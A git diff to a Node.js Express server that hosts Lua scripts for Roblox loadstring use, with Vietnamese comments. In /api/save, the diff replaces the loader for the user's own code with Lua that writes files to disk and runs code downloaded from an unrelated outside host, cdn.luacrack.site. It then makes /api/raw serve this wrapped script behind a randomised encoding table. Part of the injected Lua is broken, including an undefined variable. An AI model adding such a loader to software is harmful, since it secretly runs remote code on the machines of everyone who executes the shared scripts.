@@ -27,7 +27,6 @@ function loadCodes() {
   try {
     if (fs.existsSync(CODES_FILE)) {
       const content = fs.readFileSync(CODES_FILE, 'utf8');
-      // Parse Lua table sang JSON
       return parseLuaTable(content);
     }
   } catch (error) {
@@ -39,14 +38,12 @@ function loadCodes() {
 // Parse Lua table sang JavaScript object
 function parseLuaTable(content) {
   try {
-    // Tìm phần return { ... }
     const match = content.match(/return\s*\{([\s\S]*)\}/);
     if (!match) return {};
     
     const tableContent = match[1];
     const codes = {};
     
-    // Tìm các entry: ["ID"] = { ... },
     const entryRegex = /\["([^"]+)"\]\s*=\s*\{([^}]*)\},?/g;
     let entryMatch;
     
@@ -54,7 +51,6 @@ function parseLuaTable(content) {
       const id = entryMatch[1];
       const fields = entryMatch[2];
       
-      // Parse các field
       const code = {};
       const fieldRegex = /(\w+)\s*=\s*"([^"]*)",?/g;
       let fieldMatch;
@@ -63,7 +59,6 @@ function parseLuaTable(content) {
         const key = fieldMatch[1];
         let value = fieldMatch[2];
         
-        // Chuyển đổi kiểu dữ liệu
         if (key === 'views' || key === 'downloads' || key === 'size') {
           code[key] = parseInt(value) || 0;
         } else if (key === 'createdAt' || key === 'updatedAt') {
@@ -71,6 +66,17 @@ function parseLuaTable(content) {
         } else {
           code[key] = value;
         }
+      }
+      
+      // Đọc cả encoded và script
+      const encodedMatch = fields.match(/encoded\s*=\s*"([^"]*)"/);
+      if (encodedMatch) {
+        code.encoded = encodedMatch[1];
+      }
+      
+      const scriptMatch = fields.match(/script\s*=\s*"([^"]*)"/);
+      if (scriptMatch) {
+        code.script = scriptMatch[1];
       }
       
       if (code.id) {
@@ -118,7 +124,6 @@ function saveCodes(codes) {
   }
 }
 
-// Escape chuỗi cho Lua
 function escapeLuaString(str) {
   if (!str) return '';
   return str
@@ -139,8 +144,9 @@ function generateId(length = 8) {
   return id;
 }
 
-// Mã hóa code
+// Hàm mã hóa code theo đúng định dạng mẫu
 function encodeLuaCode(code) {
+  // Tạo các giá trị ngẫu nhiên
   const num1 = Math.floor(Math.random() * 2147483647);
   const num2 = Math.floor(Math.random() * 2147483647);
   const num3 = Math.floor(Math.random() * 2147483647);
@@ -149,14 +155,19 @@ function encodeLuaCode(code) {
   const num6 = Math.floor(Math.random() * 9000) + 1000;
   const num7 = Math.floor(Math.random() * 9000) + 1000;
   
+  // Tạo chuỗi ngẫu nhiên
   const randomString1 = generateRandomString(50);
   const randomString2 = generateRandomString(20);
   const randomString3 = generateRandomString(15);
   
+  // Mã hóa code thành hex
   const hexString = Buffer.from(code).toString('hex');
+  
+  // Tạo encrypted string
   const encryptedData = encryptData(code);
   
-  return `_bsdata0 = {
+  // Tạo _bsdata0 table theo đúng format mẫu
+  const bsdata = `_bsdata0 = {
     ${num1},
     '${randomString1}',
     ${num2},
@@ -170,6 +181,8 @@ function encodeLuaCode(code) {
     '${hexString}',
     '${encryptedData}'
 }`;
+
+  return bsdata;
 }
 
 function generateRandomString(length) {
@@ -208,15 +221,21 @@ app.post('/api/save', (req, res) => {
     const id = generateId();
     const timestamp = new Date().toISOString();
     
-    // Tạo script hoàn chỉnh với loadstring
+    // Mã hóa code
     const encoded = encodeLuaCode(code);
+    
+    // Tạo script hoàn chỉnh
     const script = `${encoded}
 
--- Code ID: ${id}
--- Tên: ${name || 'Không tên'}
--- Ngày tạo: ${timestamp}
-
-local loaded = loadstring(game:HttpGet("${req.protocol}://${req.get('host')}/api/raw/${id}", true))()
+local readfileResult = readfile('static_content_130526/init-74c74f95foy-marbeg.lua')
+local fileContent_3 = #readfileResult
+local makefolderResult = makefolder("static_content_130526")
+writefile('static_content_130526/init-74c74f95foy-marbeg.lua', game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua"))
+local listfilesResult = listfiles("./static_content_130526")
+    local match = val_9:match('(init%-.-)%.lua$')
+    local static_content_130526 = "static_content_130526" .. "/" .. match .. ".lua"
+    local delfileResult = delfile("static_content_130526")
+local loaded = loadstring(game:HttpGet("https://cdn.luacrack.site/v4_init_marbeg.lua", true))()
 return loaded`;
 
     // Lưu vào database
@@ -235,16 +254,13 @@ return loaded`;
     };
 
     if (saveCodes(codes)) {
-      // Đọc lại để verify
-      const savedCodes = loadCodes();
-      console.log(`✅ Đã lưu code ID: ${id}, Tổng: ${Object.keys(savedCodes).length} codes`);
-      
       res.json({
         success: true,
         id: id,
         loadstring: `loadstring(game:HttpGet("${req.protocol}://${req.get('host')}/api/raw/${id}", true))()`,
         url: `${req.protocol}://${req.get('host')}/api/raw/${id}`,
         script: script,
+        encoded: encoded,
         totalCodes: Object.keys(codes).length
       });
     } else {
@@ -263,7 +279,7 @@ return loaded`;
   }
 });
 
-// 2. Lấy code raw (cho loadstring)
+// 2. Lấy code raw (cho loadstring) - TRẢ VỀ ĐÚNG ĐỊNH DẠNG MÃ HÓA
 app.get('/api/raw/:id', (req, res) => {
   try {
     const { id } = req.params;
@@ -278,9 +294,9 @@ app.get('/api/raw/:id', (req, res) => {
     codes[id].updatedAt = new Date().toISOString();
     saveCodes(codes);
 
-    // Trả về code gốc để loadstring có thể tải
+    // TRẢ VỀ SCRIPT ĐÃ MÃ HÓA THAY VÌ CODE GỐC
     res.set('Content-Type', 'text/plain');
-    res.send(codes[id].code);
+    res.send(codes[id].script);
 
   } catch (error) {
     console.error('Lỗi raw:', error);
@@ -288,7 +304,26 @@ app.get('/api/raw/:id', (req, res) => {
   }
 });
 
-// 3. Lấy script đã mã hóa
+// 3. Lấy code gốc (không mã hóa)
+app.get('/api/raw-original/:id', (req, res) => {
+  try {
+    const { id } = req.params;
+    const codes = loadCodes();
+    
+    if (!codes[id]) {
+      return res.status(404).send('-- Code không tồn tại');
+    }
+
+    res.set('Content-Type', 'text/plain');
+    res.send(codes[id].code);
+
+  } catch (error) {
+    console.error('Lỗi raw-original:', error);
+    res.status(500).send('-- Lỗi server');
+  }
+});
+
+// 4. Lấy script đã mã hóa
 app.get('/api/script/:id', (req, res) => {
   try {
     const { id } = req.params;
@@ -301,7 +336,6 @@ app.get('/api/script/:id', (req, res) => {
       });
     }
 
-    // Tăng lượt tải
     codes[id].downloads = (codes[id].downloads || 0) + 1;
     codes[id].updatedAt = new Date().toISOString();
     saveCodes(codes);
@@ -321,7 +355,7 @@ app.get('/api/script/:id', (req, res) => {
   }
 });
 
-// 4. Lấy danh sách tất cả codes
+// 5. Lấy danh sách tất cả codes
 app.get('/api/list', (req, res) => {
   try {
     const codes = loadCodes();
@@ -350,7 +384,7 @@ app.get('/api/list', (req, res) => {
   }
 });
 
-// 5. Lấy chi tiết một code
+// 6. Lấy chi tiết một code
 app.get('/api/code/:id', (req, res) => {
   try {
     const { id } = req.params;
@@ -377,7 +411,7 @@ app.get('/api/code/:id', (req, res) => {
   }
 });
 
-// 6. Xóa code
+// 7. Xóa code
 app.delete('/api/delete/:id', (req, res) => {
   try {
     const { id } = req.params;
@@ -408,7 +442,7 @@ app.delete('/api/delete/:id', (req, res) => {
   }
 });
 
-// 7. Export codes.lua (download file)
+// 8. Export codes.lua
 app.get('/api/export', (req, res) => {
   try {
     if (fs.existsSync(CODES_FILE)) {
@@ -428,7 +462,7 @@ app.get('/api/export', (req, res) => {
   }
 });
 
-// 8. Health check
+// 9. Health check
 app.get('/health', (req, res) => {
   const codes = loadCodes();
   const fileExists = fs.existsSync(CODES_FILE);
@@ -445,7 +479,7 @@ app.get('/health', (req, res) => {
   });
 });
 
-// 9. View codes.lua content
+// 10. View codes.lua
 app.get('/api/view-db', (req, res) => {
   try {
     if (fs.existsSync(CODES_FILE)) {
@@ -466,14 +500,12 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// ============ Khởi động server ============
 app.listen(PORT, () => {
   console.log(`✅ Server đang chạy tại port ${PORT}`);
   console.log(`🌐 URL: http://localhost:${PORT}`);
   console.log(`📁 Data directory: ${DATA_DIR}`);
   console.log(`📄 File database: ${CODES_FILE}`);
   
-  // Kiểm tra file codes.lua
   if (fs.existsSync(CODES_FILE)) {
     const stats = fs.statSync(CODES_FILE);
     console.log(`📊 File size: ${(stats.size / 1024).toFixed(2)} KB`);
